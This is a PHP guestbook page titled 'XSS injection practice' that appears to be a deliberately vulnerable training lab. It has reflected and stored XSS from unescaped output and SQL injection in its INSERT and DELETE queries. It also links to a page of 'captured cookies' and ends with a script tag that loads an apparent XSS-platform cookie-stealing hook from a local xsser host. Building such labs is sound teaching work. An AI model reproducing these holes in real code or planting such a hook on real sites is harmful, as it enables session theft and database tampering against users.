<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>XSS注入练习</title>
</head>
<body>
<center>
	<?php
		include('../session.php');
		include('../conn.php');
		
		echo "<br/><br/><br/><br/>";
		echo "<a href='XSSliyong.php'>点击查看得到的cookie</a><br/><br/>";
		$uname = $_GET['uname'];
		
		echo "请输入你的昵称：<br/>";
		echo "<form action='XSSzhuru.php' method='POST'>";
		echo "<input type='text' name='uname' value='".$uname."' style='width:180px'><br/><br/>";
		echo "请输入你的留言：<br/>";
		echo "<textarea name='message'></textarea><br/>";
		echo "<input type='submit' name='submit' value='提交'>";
		echo "</form>";
		
		echo "<br/><br/><b>留言列表：</b><br/><br/>";
		
		if(isset($_POST['submit'])){
			if(empty($_POST['message']) || empty($_POST['uname'])){
				echo "<script>alert('请将留言内容填写完整！');</script>";
			}else{
				$username = $_POST['uname'];
				$message = $_POST['message'];
				$time = time();
				$sqli = "INSERT into message (username,message,time) values ('$username','$message','$time')";
				$result = mysqli_query($conn,$sqli);
				if($result){
					echo "提交成功！"."<br/>";
				}else{
					echo "数据库执行出错！";
				}
			}
		}elseif(isset($_GET['delete'])){
			if(!empty($_GET['delete'])){
				$id = $_GET['delete'];
				
				$sqli = "DELETE from message where id='$id'";
				$result = mysqli_query($conn,$sqli);
				if($result){
					//echo "删除成功";
				}else{
					echo "删除失败！";
				}
			}
		}
		
		
		
		$sqli = "SELECT * from message";
		$result = mysqli_query($conn,$sqli);
		//while($row=mysqli_fetch_assoc($result)){
		while($row=mysqli_fetch_array($result)){
			$id = $row['id'];
			echo "<b>".$row['username']."</b>：".$row['message']."<br/>";
			echo date('Y-m-d H:i',$row['time'])."&nbsp<a href='XSSzhuru.php?delete=$id'>删除</a><br/><br/>";
		}
	?>
	<script src=http://127.0.0.1/xsser/4ujW2n></script>
</center>
</body>